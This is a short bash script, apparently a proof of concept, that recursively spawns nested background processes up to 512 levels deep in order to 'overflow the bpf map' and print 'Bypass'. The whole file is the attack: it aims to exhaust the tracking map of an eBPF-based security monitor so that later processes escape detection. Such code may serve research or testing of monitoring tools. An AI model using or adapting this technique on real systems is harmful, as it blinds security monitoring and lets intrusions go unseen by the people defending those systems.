#!/bin/bash

# create 512 child processes to overflow the bpf map
create_child_processes() {
  if [[ $1 -eq 512 ]]; then
    # 512th child process
    echo "Bypass"
    exit
  else
    create_child_processes $(( $1 + 1 )) &
  fi
}
# Start creating child processes from the 1st process to overflow the bpf map
create_child_processes 1

